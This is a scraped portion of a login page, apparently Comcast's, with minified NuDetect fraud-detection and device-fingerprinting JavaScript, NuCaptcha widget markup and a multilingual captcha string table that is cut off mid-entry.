"function"!==typeof nspqq.parse&&(nspqq.parse=function(a,b){function c(a,d){var e,f,n=a[d];if(n&&"object"===typeof n)for(e in n)Object.prototype.hasOwnProperty.call(n,e)&&(f=c(n,e),void 0!==f?n[e]=f:delete n[e]);return b.call(a,d,n)}var e;a=String(a);d.lastIndex=0;d.test(a)&&(a=a.replace(d,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return e=eval("("+a+")"),"function"===typeof b?c({"":e},""):e;throw new SyntaxError("nspqq.parse");})})();Array.prototype.indexOf||(Array.prototype.indexOf=function(a,b){var c=this.length>>>0,d=Number(b)||0,d=0>d?Math.ceil(d):Math.floor(d);for(0>d&&(d+=c);d<c;d++)if(d in this&&this[d]===a)return d;return-1});var autofillList=[];
function ndoAutofillInit(a,b){nds.common.addEventListener(document,"submit",nsppbdq);window.setTimeout(nsppbdq,2E3);window.setTimeout(nsppbdq,5E3)}function nsppbdq(){try{var a=nds.common.querySelectorAll(":-webkit-autofill"),b;for(b=0;b<a.length;++b)-1==autofillList.indexOf(a[b].name)&&autofillList.push(a[b].name)}catch(c){autofillList=[]}nsbbpdd("af",autofillList.join());nspdqp()}nspdqpppq("af",ndoAutofillInit);
function nsbpd(a,b){nsbbpdd("di",nsbbpddbpd());nsbbpdd("bi",nspqdqqpbd(b));nsbbpdd("probe",nsqpbqdq())}nspdqpppq("di",nsbpd);function nsqpbqd(){var a=[];a.push(nspdqpp());a.push(nds.common.bi.getScreenFingerprint());a.push(nds.common.bi.getDeviceTimezone());a.push(nds.common.bi.getPlugins());for(var b="DI",c=0;c<a.length;c++)b+="."+a[c];return b}
function nspqdqqpbd(a){var b=[];b.push(nds.common.bi.getScreenInfo());b.push(nds.common.bi.getDeviceTimezone());b.push(nds.common.bi.getDeviceLanguage());b.push("bp1-"+nds.common.util.quickHash(nds.common.bi.getPlugins()));b.push(nds.common.bi.isFlashInstalled().toString());var c=a.rt||128;b.push(nds.common.util.truncTo(document.referrer.replace(/\|/g,""),c));a=a.ut||512;b.push(nds.common.util.truncTo(navigator.userAgent.replace(/\|/g,""),a));a=nds.common.bi.getWebGLInfo();null===a?b.push("Not Supported"):
b.push("wg1-"+nds.common.util.quickHash(nspqq.stringify(a)));a="b2";for(c=0;c<b.length;c++)a+="|"+b[c];return a}function nsqpbqdq(){var a="";if(window._phantom||window.callPhantom||window.__phantomas)a+="p";window.Buffer&&(a+="n");window.emit&&(a+="c");window.spawn&&(a+="r");window.webdriver&&(a+="s");if(window.domAutomation||window.domAutomationController)a+="b";return a}function nsbbpddbpd(){return"d1-"+nds.common.util.quickHash(nsqpbqd())}
function nspdqpp(){var a="NotAvail";"undefined"!==typeof navigator&&"undefined"!==typeof navigator.userAgent&&(a=navigator.userAgent,a=a.replace(/([0-9]+\.[0-9]+)\.[0-9]+\.[0-9]+/g,"$1").replace(/([0-9]+\.[0-9]+)\.[0-9]+/g,"$1"),a=a.replace(/([0-9]+_[0-9]+)_[0-9]+_[0-9]+/g,"$1").replace(/([0-9]+_[0-9]+)_[0-9]+/g,"$1"));return a}var nspdbbpdd=0,nsdbp=null,nspdbb=!1,nsdbpdbq=null,nspdppd=/^(text|password|email|url|search|tel)$/i,nsqpdpq=!0;
function nsbbpddb(a,b){nsdbp=b.fm;nspdbb="lm"in b&&b.lm;nspqdqq(nsdbp,nspdbb);nsbbpdd("ipr","");nsppbd()}function nsppbdqqp(){}nspdqpppq("ipr",nsbbpddb,nsppbdqqp);function unbindNDEventHandlers(){nsqpdpq=!1}function nspqdqqpb(a,b,c){nds.common.addEventListener(a,b,function(a){nsqpdpq&&c(a)})}function nsppbd(){var a=nsbpdqbbdd();nsbbbdb(nsdbpdbqdp,[a])}
function nsbpdqbbdd(){for(var a=[],b=0;b<nsdbpdbq.length;b++){var c=nsdbpdbq[b];c.type&&c.type.match(nspdppd)&&(a.push(c.id),a.push(c.value.length))}return a.join(",")}var nsqpdpqqb="a",nspdpp="b",nsqpdpqq="c",nspqqq="d",nsdqqbdq="e",nsdqbpbdbq="f";
function nsqddqbd(a){a||(a=window.event);var b=null;a.target?b=a.target:a.srcElement&&(b=a.srcElement);3==b.nodeType&&(b=b.parentNode);var c;a.keyCode?c=a.keyCode:a.which&&(c=a.which);var d=!1;a.which?d=3==a.which:a.button&&(d=2==a.button);var e=0,f=0;if(a.pageX||a.pageY)e=a.pageX,f=a.pageY;else if(a.clientX||a.clientY)e=a.clientX+document.body.scrollLeft+document.documentElement.scrollLeft,f=a.clientY+document.body.scrollTop+document.documentElement.scrollTop;var k={};k[nsqpdpqqb]=a;k[nspdpp]=b;
k[nsqpdpqq]=d;k[nspqqq]=c;k[nsdqqbdq]=e;k[nsdqbpbdbq]=f;return k}function nsbbpd(a){return!nspdpp in a?null:"string"===typeof a[nspdpp].id&&""!==a[nspdpp].id?a[nspdpp].id:a[nspdpp].name}
function nspqdqq(a,b){var c=null,d=nsbpdq(document.documentElement,"input");if(b&&null!==c){a=[];for(var e=0;e<d.length;e++){var f=d[e];f.type&&f.type.match(nspdppd)&&a.push(f)}}else{for(var k=[],e=0;e<a.length;e++){var g=nspqdq(a[e]);if(null===g&&null!==c)for(var l=0;l<d.length;l++)f=d[l],f.type&&f.type.match(nspdppd)&&f.name&&f.name===a[e]&&(g=f);null!==g&&k.push(g)}a=k}nsdbpdbq=a;for(e=0;e<a.length;e++)if(g=a[e],null!==g){if(null===c)for(d=g.parentNode,f=0;8>f;f++){if(null===d||d.nodeName.match(/form/i)){c=
d;break}d=d.parentNode}g.nodeName.match(/input/i)&&(nspqdqqpb(g,"keydown",function(a){nsqddqbd(a);nsbbbdb(nsqpb,[])}),nspqdqqpb(g,"focus",function(a){a=nsqddqbd(a);nsbbbdb(nspdbbpd,[nspdpp in a&&"undefined"!==typeof a[nspdpp].value?a[nspdpp].value.length:null,nsbbpd(a)]);nsbbbdb(nsdqqbdqq,[nsbbpd(a)])}),nspqdqqpb(g,"blur",function(a){a=nsqddqbd(a);nsbbbdb(nsdqqbd,[nsbbpd(a)])}))}nspqdqqpb(document,"click",function(a){a=nsqddqbd(a);nsbbbdb(nsdbpdb,[a[nsdqqbdq],a[nsdqbpbdbq],nsbbpd(a)])});nspqdqqpb(document,
"touchstart",function(a){a=nsqddqbd(a);a.event&&a.event.touches&&a.event.touches[0]&&"undefined"!==typeof a.event.touches[0].pageX?nsbbbdb(nsqpbpdq,[a.event.touches[0].pageX,a.event.touches[0].pageY,nsbbpd(a)]):nsbbbdb(nsqpbpdq,[-1,-1,nsbbpd(a)])});nspqdqqpb(document,"mousemove",function(a){if(nsbbp()<nspdbbpdd)return!1;nspdbbpdd=nsbbp()+5;a=nsqddqbd(a);nsbbbdb(nspqqqbdqb,[a[nsdqqbdq],a[nsdqbpbdbq],nsbbpd(a)])});null!==c&&nspqdqqpb(c,"submit",function(a){a=nsqddqbd(a);nsbbbdb(nsdqbpbd,[a[nsdqqbdq],
a[nsdqbpbdbq],c.id])})}var nsdqqbdqq="ff",nsdqqbd="fb",nsqpb="kd",nsdqbpb="ku",nspqqqbdqb="mm",nsdbpdb="mc",nspqqqbdq="ac",nsqpbpdq="te",nsdqbpbd="fs",nspdb="sp",nspdbbpd="kk",nsdbpdbqdp="st",nspdppddd=1,nsqddqb=1,nspdqpppqp=null,nspqdqqp=null,nsppbdqq=null,nsbpdqb=null,nsqpbqdqq="",nsbbbd="";
function nsbbbdb(a,b){var c=nsqpbq();null==nspqdqqp&&(nsbpdqb=nspqdqqp=nspdqpppqp=nsqpbq(),nsbpdqbb("ncip",c,[nsbbp(),nspdppddd,nsqddqb]));nsbpdqbb(a,c,b);15E3<=c-nsbpdqb&&(nsbpdqbb("ts",c,[c-nspdqpppqp]),nsbpdqb=c);switch(a){case nsdqqbd:case nsdqqbd:case nsdbpdb:case nsdqbpbd:nsbpdqbbd(c);break;default:2E3<c-nsppbdqq&&nsbpdqbbd(c)}}
function nsbpdqbbd(a){nsppbdqq=a;a="";""!==nsqpbqdqq&&(nsbbbd+=nsqpbqdqq,nsqpbqdqq="",a=nsbbbd,nsdqbpbdb===nspdppdd&&(a=a.replace(new RegExp(nsqpbp,"g"),nspqqqbd)),nsbbpdd("ipr",a),nspdqp())}
function nsbpdqbb(a,b,c){var d=b-nspqdqqp;1<nsqddqb&&(d=Math.round(d/nsqddqb));a=a+","+d.toString(16);if(null!=c&&0<c.length){for(var d=[],e=0;e<c.length;e++)"number"===typeof c[e]?d.push(Math.round(c[e]).toString(16)):null!=c[e]&&d.push(c[e].toString());a=a+","+d.join(",")}nsqpbqdqq=nsqpbqdqq+a+";";nspqdqqp=b}function nsqddq(a,b){nsbbpdd("fv",nds.common.bi.getHTML5SupportedVideo());nsbbpdd("fa",nds.common.bi.getHTML5SupportedAudio());nsbbpdd("bp",nds.common.bi.getPlugins())}nspdqpppq("misc",nsqddq);
function nspdq(a,b){if(nspdppdddp){var c=Math.floor(1E6*Math.random())+1E3;nsbbpdd("wkr",c);nsqpbqdqqp(b.r+"?r="+c+"&wt="+b.w);nsbbpdd("wk","p")}}nspdqpppq("wk",nspdq);function ndwtw(a){nspdppdddp&&("string"===typeof a&&(a=nsppbdqqpb(a)),nsbbpdd("wk",a.wk),nspdqp())}function nsbbp(){return parseInt((new Date).getTime()/1E3,10)}function nsqpbq(){return parseInt((new Date).getTime(),10)}
function nsqpbqdqqp(a){var b=document.createElement("script");b.setAttribute("type","text/JavaScript");b.setAttribute("src",a);document.getElementsByTagName("head")[0].appendChild(b)}function nspqdq(a){var b=null;document.getElementById?b=document.getElementById(a):document.all&&(b=document.all[a]);return b}function nsbpdq(a,b){var c=[];"undefined"!==typeof a.getElementsByTagName&&(c=a.getElementsByTagName(b));return c}
var ndoWidgetUtil={isLoaded:function(a,b){try{nds.common.addEventListener(window,"load",function d(){var c=nsbbpddbp(a),f=!1;document.getElementById(c)&&(f=!0);b(f);nds.common.removeEventListener(window,"load",d)})}catch(c){b(!1)}}};
</script><script type="text/javascript">function ndpd_load(){try{ndwti( {"did":"ndwc","fff":"ndpd-%NAME%","ffft":"%NAME%","ffmm":"fmpm","fsss":"ndpd-spbd","ddkv":"~~~","dddf":"|||","dddr":"","ddde":false,"ppns":"sssc","ppmm":"ensc","ppdd":";","ppds":";","wwwe":true,"fd":{"s":"1.w-341498.1.2.1UxcveWhF6Sbl0adl5UhrQ,,.oOZLKicavnqIebhjrMNyQ_qM_wH87U4FAWl6Wr1-9zwr1wrsMfsh0e8_F_Tm8nDMv5_H9Y8Lw-tmSJV0TCNGWzhV2JTN5N9FrHkHrB9ffW76tfbcbcsH_CV16ZSS89WipdiRK5-56Div-DGP8B6O5tx096qtdc1H-b9xaXWq3b6q4zq76CYgj9T2AY0FceGpGShj7Dje-tzZQpuG2xZ3vSmesHk53pJL7_POnK4WS8wciONMYEMfoxFQCc_Kng0i2Cy0HgvMsOnvFCdrn2pJmeR6elYGEZi8_IFzMj85OxsxvPJOuiqmG4lgfL6mqvgR","f":"1.w-341498.1.2.9VJt8_qtBAVOipfaZjOwoQ,,.xBGbp50WS0Pm2T6MvLDv8lwPEjWkjpO6bLWw91OOuDWTOM8ebABRY36QGCLbTE1Suftg-k2cY_PpIHkJ7ycODAfEywxoDQ8kPKTWYpmd3BQyAw7wyDn57K0PKKG4fU4od88lHrzjnFtzk3bdq-1HcSE-hEA47KDcghrDF0TxNXvQSAdxF66PCnt_ysC3I8G84ivAMOmIVBmSex9JeGFgiSGHkeTD474i2uQbvZVFFiV_vkXnhmIzbqtAbCOafl373-2Uiq2Fr0Vydj5WILOOOG8-NgpJ1j8EZ5mk4zk-v3T5mwWJL59xHKKsKl3qh-f-","fm":"1.w-341498.1.2.7ho0dztzmuwG57S8Gm2hPw,,.Lk3UkF-8Fomz81ILghsk1fI0kgmdVi0cpnvNv5DJEKJ2xpx970iNtMuMVl9p1yGhNjIub6F-d1OJmt9nvFhOofv_QJms75ADa8sRDwqGEj9SabXu0V3RiaW_QtkqK5BD5XuLvK9EAOlxLmq7PEe4SKVXdf16bQDj730LSp025xtWQRZcX9Kpw6AOHmTRHvSlWc1mIsDbuXV9i6BLHOZXxfItD0ac-tGR7KV1eb_nA9j0-FfcdLdL4IjgwfqnBvim_n0WlW2J4U1w1K0eXHIgc3MhJ-my08N32FwtEZD085o0sDUkKpGhM-LrHWPHKySX","w":"1.w-341498.1.2.p_ojOMF4ODwKGkgKjMFMSA,,.M-QqO1QjpR_KsH913Ikh6i-7ktNUibJviLaE23lM1HVYqEXajJaWclFr0Mr_TXL4Zqv9y1nezZjuXP938LYohvQio3xhC7Z0gV7ZrOSbTcY8xsEKq-xa7ciuHc2lamOg15hSi0AIt2mooSAmqATgSJGHBO1VDBzQsrUb5W2T-PRpO1wZrZYZ8LUUb4YZS2fdvjV0uNtMEch43IGBwKzuW1qXxkoFGjDJ-5IWlAn2z9Gd5EHfMCqBMSqStxwuRHA9CX1PTo5VYXYI8T3q8ZONjB1EsbWbtKDEj-iIMCVhpC5MEt1pbdtdhGJ-esAVvCXi_Ee7p-mFPxbiR1oULBZRgMCIRbF4isuRSQwY7okZgnFjDC9KnQ3OwyT_R-ka6TaR"},"wmd":{"ipr":{"fm":[],"lm":false},"di":{"rt":"128","ut":"512"},"af":[],"misc":[],"wk":{"r":"https:\/\/login.comcast.net\/proxy\/nudetect\/65786\/w-341498\/w","w":"1.w-341498.1.2.q48keO-kl9cV5GEq4WKghg,,.ZG79Yq4Xg6x1hOGdJLKvoAmLJ4YTfIuzywf5YKx6_rUhjKiVS6Ws3pLg7qQcdJybXd7IKmGgJUWDs00jF02En-0NOqtAJRk-H0lTZQahXlvM0aCuIUK5G_hGnBUPaRsFTKx69T7GBQ8-6cVC_Dfn91WIYtYUCKuzlRd9dc03yrXZKK3SI-mgmNCUM7NFg-ju6hQf4uBpfP1NMwQ_DSexOPIxiRcFrWF7YD6tnwcttDDbFn0b0tZ5csSZe2S22Qly2iJVvjfObM1m89hpzUEkldiH5VnuoRK4xmBclb4utCqillZEXQgAV-i-BGCW83j6XnUqCFEh0MtZhR1RgZDF1QniGN4-0OaIApASQbSIeRg,"}}} );}catch(err){var ndpd_suffixes=[""];for(var ndpd_i=ndpd_suffixes.length-1;ndpd_i>=0;--ndpd_i){var ndpd_suffix=ndpd_suffixes[ndpd_i];var ndpd_jse=document.createElement("input");ndpd_jse.type="hidden";ndpd_jse.name="ndpd-jse";ndpd_jse.value=err.message;ndpd_jse.id="ndpd-jse"+ndpd_suffix;document.getElementById("ndwc"+ndpd_suffix).appendChild(ndpd_jse);}}}if("complete"===document.readyState){ndpd_load();}else if(window.addEventListener){window.addEventListener("load", ndpd_load);}else if(window.attachEvent){window.attachEvent("onload", ndpd_load);}else {ndpd_load();}</script><div id="nd-captcha" class="nd-captcha" lang="en"><div id="nucaptcha-widget" hidden class="nucaptcha-widget" role="group" aria-label="NuCaptcha Widget">
	<div id="nucaptcha-widget-container" hidden class="nucaptcha-widget-container">
		<noscript>
			<div id="nucaptcha-player-ns" class="wm-noscript pm-video dt-gif pt-noscript no-png nucaptcha-player-ns">

				<div id="media-container">
					<img id="nucaptcha-media" class="nucaptcha-media" src="https://login.comcast.net/proxy/nudetect/65786/w-341498/captcha?token=1.w-341498.1.2.59CW_1gI92VIQrw-IZ2Zcg%2C%2C.uWavZsN3HA1a6jtrllIfIWNBaHKWWe9R0kBYJUT0n1PXSAJdUEj2H0PnoJK1s2-p9PgyX_m5SzvaVjsXOxFhAWCLGcV4sCPD19bqTBwOf2z38nontWQzjOrVF28n3hA9RDTSbTm0OeiwBjd2jroKYXpAYTK3xG-MxeGgAp1JKGc6woeErXJPfdW9aa47DA4jEgYeGIZFKgdqfIRtvteNAFWfgc329lBbmBtMiFgJv-nD-eJjBrmveQWFvTYAkOnY7mcQ4v2-G94tXCYthvlYN5OhnZBGn5u0ATlV1w4pgVTSQSSKpKgdlZgLvK86mgTNa2jMFTxAZ0zABlCDW54nu4dg1oBqQsZ3mqlJwdOav4NNOAqD3ALEho6QaedW7Kdz&lang=eng&ptype=NOSCRIPT&type=VIDEO&index=0&r=rs-FI0tyrFmOh04DKPpb6q3nQxx"
								width="240" height="60" alt="NuCaptcha Media">
				</div>

				<label id="directions-verbose-label" class="directions-verbose-label" for="nucaptcha-answer">Type the moving characters</label>
				<input id="nucaptcha-answer" class="nucaptcha-answer" name="nucaptcha-answer" type="text" maxlength="64" autocomplete="off">

				<div id="private-container" style="display:none;">
					<input id="nucaptcha-language" name="nucaptcha-language" type="hidden" value="eng">
					<input id="nucaptcha-index" name="nucaptcha-index" type="hidden" value="0">
					<input id="nucaptcha-type" name="nucaptcha-type" type="hidden" value="VIDEO">
					<input id="nucaptcha-ptype" name="nucaptcha-ptype" type="hidden" value="NOSCRIPT">
					<input id="nucaptcha-token" name="nucaptcha-token" type="hidden" value="1.w-341498.1.2.59CW_1gI92VIQrw-IZ2Zcg,,.uWavZsN3HA1a6jtrllIfIWNBaHKWWe9R0kBYJUT0n1PXSAJdUEj2H0PnoJK1s2-p9PgyX_m5SzvaVjsXOxFhAWCLGcV4sCPD19bqTBwOf2z38nontWQzjOrVF28n3hA9RDTSbTm0OeiwBjd2jroKYXpAYTK3xG-MxeGgAp1JKGc6woeErXJPfdW9aa47DA4jEgYeGIZFKgdqfIRtvteNAFWfgc329lBbmBtMiFgJv-nD-eJjBrmveQWFvTYAkOnY7mcQ4v2-G94tXCYthvlYN5OhnZBGn5u0ATlV1w4pgVTSQSSKpKgdlZgLvK86mgTNa2jMFTxAZ0zABlCDW54nu4dg1oBqQsZ3mqlJwdOav4NNOAqD3ALEho6QaedW7Kdz">
				</div>
			</div>
		</noscript>
	</div>
</div>

<script type="text/javascript">var ncLanguages={},ncLanguageDict={eng:{_DOWNLOAD_AUDIO_:"Download An Audio Challenge",_AUDIO_LISTEN_AGAIN_:"Replay Audio Sample",_AUDIO_NEW_CHALLENGE_:"Get A New Challenge",_REFRESH_BUTTON_:"Get A New Challenge",_AUDIO_BUTTON_:"Get An Audio Challenge",_PLAYER_AUDIO_:"Audio Challenge",_PLAYER_VIDEO_:"Video Challenge","_DIRECTIONS_VERBOSE[0000]_":"Type the moving characters","_DIRECTIONS[0000]_":"Moving characters:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Type the characters you hear in the audio","_DIRECTIONS_AUDIO[0000]_":"Characters you hear:",
_AUDIO_BUTTON_RETURN_:"Return to Visual Challenge","_DIRECTIONS2[0000]_":"Moving characters:","_DIRECTIONS2_VERBOSE[0000]_":"Type the moving characters","_DIRECTIONS2_AUDIO[0000]_":"Characters you hear:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Type the characters you hear in the audio",_ERROR_:"An unexpected issue occurred.<br>Please %_MAILTO_START_%click here%_MAILTO_END_% to report the problem.",_ERROR_EMAIL_SUBJECT_:"Player Status",_ERROR_EMAIL_BODY_:"Please tell us what happened so we can improve our system.\n\nDetails\n==========\n%_DETAILS_%",
_JS_REQUIRED_:"Javascript is required for this human verification test.  Please enable Javascript and reload the page."},ukr:{_DOWNLOAD_AUDIO_:"&#1047;&#1072;&#1074;&#1072;&#1085;&#1090;&#1072;&#1078;&#1080;&#1090;&#1080; &#1072;&#1091;&#1076;&#1110;&#1086; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;",_AUDIO_LISTEN_AGAIN_:"&#1074;&#1110;&#1076;&#1090;&#1074;&#1086;&#1088;&#1102;&#1074;&#1072;&#1090;&#1080; &#1072;&#1091;&#1076;&#1110;&#1086; &#1079;&#1088;&#1072;&#1079;&#1086;&#1082;",_AUDIO_NEW_CHALLENGE_:"&#1054;&#1090;&#1088;&#1080;&#1084;&#1072;&#1090;&#1080; &#1085;&#1086;&#1074;&#1080;&#1081; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;",
_REFRESH_BUTTON_:"&#1054;&#1090;&#1088;&#1080;&#1084;&#1072;&#1090;&#1080; &#1085;&#1086;&#1074;&#1080;&#1081; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;",_AUDIO_BUTTON_:"&#1054;&#1090;&#1088;&#1080;&#1084;&#1072;&#1090;&#1080; Audio &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;",_PLAYER_AUDIO_:"&#1040;&#1091;&#1076;&#1110;&#1086; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;",_PLAYER_VIDEO_:"&#1042;&#1110;&#1076;&#1077;&#1086; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;","_DIRECTIONS_VERBOSE[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1110;&#1090;&#1100; &#1090;&#1077;&#1082;&#1089;&#1090; &#1088;&#1091;&#1093;&#1086;&#1084;&#1080;&#1081;",
"_DIRECTIONS[0000]_":"&#1055;&#1077;&#1088;&#1077;&#1084;&#1110;&#1097;&#1077;&#1085;&#1085;&#1103; &#1090;&#1077;&#1082;&#1089;&#1090;&#1091;:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1110;&#1090;&#1100; &#1090;&#1077;&#1082;&#1089;&#1090;, &#1103;&#1082;&#1080;&#1081; &#1074;&#1080; &#1095;&#1091;&#1108;&#1090;&#1077; &#1074; &#1072;&#1091;&#1076;&#1110;&#1086;","_DIRECTIONS_AUDIO[0000]_":"&#1058;&#1077;&#1082;&#1089;&#1090; &#1074;&#1080; &#1095;&#1091;&#1108;&#1090;&#1077;",
_AUDIO_BUTTON_RETURN_:"&#1055;&#1086;&#1074;&#1077;&#1088;&#1085;&#1091;&#1090;&#1080;&#1089;&#1103; &#1076;&#1086; &#1074;&#1110;&#1079;&#1091;&#1072;&#1083;&#1100;&#1085;&#1086;&#1075;&#1086; &#1074;&#1080;&#1082;&#1083;&#1080;&#1082;","_DIRECTIONS2[0000]_":"&#1055;&#1077;&#1088;&#1077;&#1084;&#1110;&#1097;&#1077;&#1085;&#1085;&#1103; &#1090;&#1077;&#1082;&#1089;&#1090;&#1091;:","_DIRECTIONS2_VERBOSE[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1110;&#1090;&#1100; &#1090;&#1077;&#1082;&#1089;&#1090; &#1088;&#1091;&#1093;&#1086;&#1084;&#1080;&#1081;",
"_DIRECTIONS2_AUDIO[0000]_":"&#1058;&#1077;&#1082;&#1089;&#1090; &#1074;&#1080; &#1095;&#1091;&#1108;&#1090;&#1077;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#1042;&#1074;&#1077;&#1076;&#1110;&#1090;&#1100; &#1090;&#1077;&#1082;&#1089;&#1090;, &#1103;&#1082;&#1080;&#1081; &#1074;&#1080; &#1095;&#1091;&#1108;&#1090;&#1077; &#1074; &#1072;&#1091;&#1076;&#1110;&#1086;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},slk:{_DOWNLOAD_AUDIO_:"Stiahnu&#357; Audio v&#253;zvou",_AUDIO_LISTEN_AGAIN_:"Prehra&#357; zvukov&#233; uk&#225;&#382;ky",
_AUDIO_NEW_CHALLENGE_:"Z&#237;ska&#357; nov&#250; v&#253;zvu",_REFRESH_BUTTON_:"Z&#237;ska&#357; nov&#250; v&#253;zvu",_AUDIO_BUTTON_:"Z&#237;skajte Audio v&#253;zvu",_PLAYER_AUDIO_:"Audio v&#253;zva",_PLAYER_VIDEO_:"Video v&#253;zvou","_DIRECTIONS_VERBOSE[0000]_":"Zadajte pohybliv&#253; text","_DIRECTIONS[0000]_":"Pohybliv&#253; text:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Zadajte text, ktor&#253; po&#269;ujete v audio","_DIRECTIONS_AUDIO[0000]_":"Text po&#269;ujete:",_AUDIO_BUTTON_RETURN_:"Sp&#228;&#357; na vizu&#225;lne v&#253;zvou",
"_DIRECTIONS2[0000]_":"Pohybliv&#253; text:","_DIRECTIONS2_VERBOSE[0000]_":"Zadajte pohybliv&#253; text","_DIRECTIONS2_AUDIO[0000]_":"Text po&#269;ujete:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Zadajte text, ktor&#253; po&#269;ujete v audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},ron:{_DOWNLOAD_AUDIO_:"Descarca O provocare audio",_AUDIO_LISTEN_AGAIN_:"Reluarea e&#537;antion Audio",_AUDIO_NEW_CHALLENGE_:"La o nou&#259; provocare",_REFRESH_BUTTON_:"La o nou&#259; provocare",
_AUDIO_BUTTON_:"La o provocare de audio",_PLAYER_AUDIO_:"Provocare de audio",_PLAYER_VIDEO_:"Provocare de Video","_DIRECTIONS_VERBOSE[0000]_":"Introduce&#539;i textul &#238;n mi&#537;care","_DIRECTIONS[0000]_":"Mutarea textului:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Introduce&#539;i textul pe care &#238;l auzi &#238;n audio","_DIRECTIONS_AUDIO[0000]_":"Text auzi:",_AUDIO_BUTTON_RETURN_:"&#206;ntoarce&#539;i-v&#259; la provocare de vizual&#259;","_DIRECTIONS2[0000]_":"Mutarea textului:","_DIRECTIONS2_VERBOSE[0000]_":"Introduce&#539;i textul &#238;n mi&#537;care",
"_DIRECTIONS2_AUDIO[0000]_":"Text auzi:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Introduce&#539;i textul pe care &#238;l auzi &#238;n audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},pol:{_DOWNLOAD_AUDIO_:"Pobierz wyzwanie audio",_AUDIO_LISTEN_AGAIN_:"Powt&#243;rka pr&#243;bki audio",_AUDIO_NEW_CHALLENGE_:"Pobierz nowe wyzwanie",_REFRESH_BUTTON_:"Pobierz nowe wyzwanie",_AUDIO_BUTTON_:"Pobierz wyzwanie audio",_PLAYER_AUDIO_:"Wyzwanie audio",_PLAYER_VIDEO_:"Wyzwanie wideo",
"_DIRECTIONS_VERBOSE[0000]_":"Wpisz poruszaj&#261;ce litery","_DIRECTIONS[0000]_":"Poruszaj&#261;ce litery:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Wpisz litery, kt&#243;re s&#322;yszysz w Audio","_DIRECTIONS_AUDIO[0000]_":"Litery s&#322;yszysz:",_AUDIO_BUTTON_RETURN_:"Powr&#243;t do prowokacji wizualnej","_DIRECTIONS2[0000]_":"Poruszaj&#261;ce litery:","_DIRECTIONS2_VERBOSE[0000]_":"Wpisz poruszaj&#261;ce litery","_DIRECTIONS2_AUDIO[0000]_":"Litery s&#322;yszysz:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Wpisz litery, kt&#243;re s&#322;yszysz w Audio",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},hun:{_DOWNLOAD_AUDIO_:"T&#246;ltse le az audio kih&#237;v&#225;st",_AUDIO_LISTEN_AGAIN_:"Visszaj&#225;tsz&#225;s Audi&#243; Sample",_AUDIO_NEW_CHALLENGE_:"Kap egy &#250;j kih&#237;v&#225;s",_REFRESH_BUTTON_:"Kap egy &#250;j kih&#237;v&#225;s",_AUDIO_BUTTON_:"Egy audio kih&#237;v&#225;st",_PLAYER_AUDIO_:"Audio kih&#237;v&#225;st",_PLAYER_VIDEO_:"Video kih&#237;v&#225;st","_DIRECTIONS_VERBOSE[0000]_":"&#205;rja be a mozg&#243; sz&#246;veget",
"_DIRECTIONS[0000]_":"Mozg&#243; sz&#246;veg:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#205;rja be a sz&#246;veget hallod","_DIRECTIONS_AUDIO[0000]_":"Sz&#246;veg hallod:",_AUDIO_BUTTON_RETURN_:"Vissza vizu&#225;lis kih&#237;v&#225;st","_DIRECTIONS2[0000]_":"Mozg&#243; sz&#246;veg:","_DIRECTIONS2_VERBOSE[0000]_":"&#205;rja be a mozg&#243; sz&#246;veget","_DIRECTIONS2_AUDIO[0000]_":"Sz&#246;veg hallod:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#205;rja be a sz&#246;veget hallod",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",
_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},heb:{_DOWNLOAD_AUDIO_:"&#1492;&#1493;&#1512;&#1491; &#1488;&#1514;&#1490;&#1512; &#1488;&#1493;&#1491;&#1497;&#1493;",_AUDIO_LISTEN_AGAIN_:"&#1500;&#1495;&#1494;&#1493;&#1512; &#1500;&#1491;&#1493;&#1490;&#1502;&#1488; &#1488;&#1493;&#1491;&#1497;&#1493;",_AUDIO_NEW_CHALLENGE_:"&#1511;&#1489;&#1500; &#1488;&#1514;&#1490;&#1512; &#1495;&#1491;&#1513;",_REFRESH_BUTTON_:"&#1511;&#1489;&#1500; &#1488;&#1514;&#1490;&#1512; &#1495;&#1491;&#1513;",_AUDIO_BUTTON_:"&#1511;&#1489;&#1500; &#1488;&#1514;&#1490;&#1512; &#1488;&#1493;&#1491;&#1497;&#1493;",
